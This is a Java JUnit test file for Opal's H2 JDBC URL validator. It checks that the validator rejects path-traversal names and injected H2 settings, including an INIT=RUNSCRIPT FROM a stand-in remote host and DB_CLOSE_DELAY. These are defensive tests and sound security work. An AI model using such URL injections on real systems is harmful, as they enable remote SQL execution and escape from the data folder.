/*
 * Copyright (c) 2021 OBiBa. All rights reserved.
 *
 * This program and the accompanying materials
 * are made available under the terms of the GNU Public License v3.0.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.obiba.opal.core.runtime.jdbc;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.obiba.opal.core.service.database.InvalidH2DatabaseException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

import static org.fest.assertions.api.Assertions.assertThat;
import static org.fest.assertions.api.Assertions.fail;

public class H2DatabaseUrlsTest {

  @Rule
  public TemporaryFolder temporaryFolder = new TemporaryFolder();

  @Test
  public void test_is_h2() {
    assertThat(H2DatabaseUrls.isH2("org.h2.Driver")).isTrue();
    assertThat(H2DatabaseUrls.isH2("org.postgresql.Driver")).isFalse();
    assertThat(H2DatabaseUrls.isH2(null)).isFalse();
  }

  @Test
  public void test_database_name() {
    assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:opal")).isEqualTo("opal");
    assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:my-db_1.0")).isEqualTo("my-db_1.0");
  }

  @Test
  public void test_database_name_must_be_a_plain_name() {
    // a name is the only thing that can be expressed, so there is no path to escape from
    assertRejected("jdbc:h2:file:../../etc/opal");
    assertRejected("jdbc:h2:file:/var/lib/opal");
    assertRejected("jdbc:h2:file:sub/opal");
    assertRejected("jdbc:h2:file:sub\\opal");
    assertRejected("jdbc:h2:file:.opal");
    assertRejected("jdbc:h2:file:");
  }

  @Test
  public void test_h2_settings_are_not_accepted() {
    // a setting is not a tuning knob but a second language: INIT alone runs arbitrary SQL when the connection opens
    assertRejected("jdbc:h2:file:opal;DB_CLOSE_DELAY=-1");
    assertRejected("jdbc:h2:file:opal;INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
    assertRejected("jdbc:h2:file:;DB_CLOSE_DELAY=-1");
  }

  @Test
  public void test_init_connection_property_is_rejected() {
    assertPropertiesRejected("INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
    assertPropertiesRejected("MODE=PostgreSQL;init=CREATE SCHEMA S");
    assertPropertiesRejected(" Init = SELECT 1 ");
  }

  @Test
  public void test_close_connection_properties_are_rejected() {
    // H2 writes the store to physical disk when the database is closed, and these are the two ways of preventing
    // that close from happening
    assertPropertiesRejected("DB_CLOSE_ON_EXIT=FALSE");
    assertPropertiesRejected("MODE=PostgreSQL;db_close_on_exit=false");
    assertPropertiesRejected("DB_CLOSE_ON_EXIT");
    assertPropertiesRejected("DB_CLOSE_DELAY=-1");
    assertPropertiesRejected(" DB_CLOSE_DELAY = 10 ");
  }

  @Test
  public void test_properties_without_a_reserved_setting_are_accepted() {
    H2DatabaseUrls.validateProperties(null);
    H2DatabaseUrls.validateProperties("");
    H2DatabaseUrls.validateProperties("MODE=PostgreSQL");
    // stating the defaults Opal relies on is not a change
    H2DatabaseUrls.validateProperties("DB_CLOSE_ON_EXIT=TRUE;DB_CLOSE_DELAY=0");
    // a value that merely mentions the setting is not one
    H2DatabaseUrls.validateProperties("MODE=INIT");
  }

  @Test
  public void test_only_file_urls_are_accepted() {
    assertRejected("jdbc:h2:mem:opal");
    assertRejected("jdbc:h2:tcp://localhost:9092/opal");
    assertRejected("jdbc:h2:ssl://localhost:9092/opal");
    assertRejected("jdbc:h2:zip:~/db.zip!/opal");
    assertRejected("jdbc:h2:/var/lib/opal");
    assertRejected("jdbc:postgresql://localhost:5432/opal");
    assertRejected(null);
  }

  @Test
  public void test_expand() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(H2DatabaseUrls.expand("jdbc:h2:file:opal", root))
        .isEqualTo("jdbc:h2:file:" + new File(root, "opal").getAbsolutePath());
  }

  @Test
  public void test_expand_creates_the_h2_folder() {
    File root = new File(temporaryFolder.getRoot(), "data/h2");
    assertThat(root.exists()).isFalse();
    H2DatabaseUrls.expand("jdbc:h2:file:opal", root);
    assertThat(root.isDirectory()).isTrue();
  }

  @Test
  public void test_validate_rejects_a_legacy_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "opal.h2.db").createNewFile()).isTrue();
    assertRejected("jdbc:h2:file:opal", root);
  }

  @Test
  public void test_validate_accepts_a_migrated_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "opal.h2.db").createNewFile()).isTrue();
    assertThat(new File(root, "opal.mv.db").createNewFile()).isTrue();
    H2DatabaseUrls.validate("jdbc:h2:file:opal", root);
  }

  @Test
  public void test_validate_accepts_a_new_database() throws IOException {
    H2DatabaseUrls.validate("jdbc:h2:file:opal", temporaryFolder.newFolder("h2"));
  }

  @Test
  public void test_project_url_round_trip() {
    assertThat(H2DatabaseUrls.projectUrl("CLSA")).isEqualTo("jdbc:h2:file:CLSA/data");
    assertThat(H2DatabaseUrls.getProjectName("jdbc:h2:file:CLSA/data")).isEqualTo("CLSA");
    // a space is legal in a project name, in a folder name and in an H2 file URL
    assertThat(H2DatabaseUrls.projectUrl("My Study")).isEqualTo("jdbc:h2:file:My Study/data");
    assertThat(H2DatabaseUrls.getProjectName("jdbc:h2:file:My Study/data")).isEqualTo("My Study");
  }

  @Test
  public void test_project_name_must_be_a_project_name() {
    // the name becomes a folder name, so nothing that could reach outside the H2 folder is a project name
    for(String projectName : new String[] { "..", "../escape", "sub/project", "sub\\project", "/var/lib/opal",
        "opal;DB_CLOSE_DELAY=-1", ".hidden", "with.dot", "", null }) {
      try {
        H2DatabaseUrls.projectUrl(projectName);
        fail("Expected an InvalidH2DatabaseException for project name: " + projectName);
      } catch(InvalidH2DatabaseException ignored) {
      }
    }
  }

  @Test
  public void test_project_url_must_name_the_project_database() {
    for(String url : new String[] { "jdbc:h2:file:CLSA", "jdbc:h2:file:CLSA/other", "jdbc:h2:file:CLSA/data/more",
        "jdbc:h2:file:/CLSA/data", "jdbc:h2:file:../CLSA/data", "jdbc:h2:mem:CLSA/data", "jdbc:h2:file:", null }) {
      try {
        H2DatabaseUrls.getProjectName(url);
        fail("Expected an InvalidH2DatabaseException for URL: " + url);
      } catch(InvalidH2DatabaseException ignored) {
      }
    }
  }

  @Test
  public void test_a_project_url_is_not_a_database_name() {
    // the two forms cannot be mistaken for one another: a registered database is a plain file name
    try {
      H2DatabaseUrls.getDatabaseName("jdbc:h2:file:CLSA/data");
      fail("Expected an InvalidH2DatabaseException");
    } catch(InvalidH2DatabaseException ignored) {
    }
  }

  @Test
  public void test_expand_project() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(H2DatabaseUrls.expandProject("jdbc:h2:file:My Study/data", root))
        .isEqualTo("jdbc:h2:file:" + new File(root, "My Study/data").getAbsolutePath());
  }

  @Test
  public void test_expand_project_creates_the_project_folder() {
    File root = new File(temporaryFolder.getRoot(), "data/h2");
    H2DatabaseUrls.expandProject("jdbc:h2:file:CLSA/data", root);
    assertThat(new File(root, "CLSA").isDirectory()).isTrue();
  }

  @Test
  public void test_project_folder_of_a_symlinked_h2_folder_is_inside_it() throws IOException {
    // canonicalising both sides is what makes a symlinked H2 folder pass a containment check that compares paths
    File real = temporaryFolder.newFolder("real-h2");
    File link = new File(temporaryFolder.getRoot(), "h2");
    Files.createSymbolicLink(link.toPath(), real.toPath());

    assertThat(H2DatabaseUrls.projectFolder("CLSA", link).getCanonicalPath())
        .isEqualTo(new File(real, "CLSA").getCanonicalPath());
  }

  @Test
  public void test_validate_project_rejects_a_legacy_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "CLSA").mkdir()).isTrue();
    assertThat(new File(root, "CLSA/data.h2.db").createNewFile()).isTrue();
    try {
      H2DatabaseUrls.validateProject("jdbc:h2:file:CLSA/data", root);
      fail("Expected an InvalidH2DatabaseException");
    } catch(InvalidH2DatabaseException ignored) {
    }
  }

  @Test
  public void test_validate_project_accepts_a_migrated_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "CLSA").mkdir()).isTrue();
    assertThat(new File(root, "CLSA/data.h2.db").createNewFile()).isTrue();
    assertThat(new File(root, "CLSA/data.mv.db").createNewFile()).isTrue();
    H2DatabaseUrls.validateProject("jdbc:h2:file:CLSA/data", root);
  }

  @Test
  public void test_validate_project_accepts_a_new_database() throws IOException {
    H2DatabaseUrls.validateProject("jdbc:h2:file:CLSA/data", temporaryFolder.newFolder("h2"));
  }

  private void assertPropertiesRejected(String properties) {
    try {
      H2DatabaseUrls.validateProperties(properties);
      fail("Expected an InvalidH2DatabaseException for properties: " + properties);
    } catch(InvalidH2DatabaseException ignored) {
    }
  }

  private void assertRejected(String url) {
    assertRejected(url, temporaryFolder.getRoot());
  }

  private void assertRejected(String url, File root) {
    try {
      H2DatabaseUrls.validate(url, root);
      fail("Expected an InvalidH2DatabaseException for URL: " + url);
    } catch(InvalidH2DatabaseException ignored) {
    }
  }
}
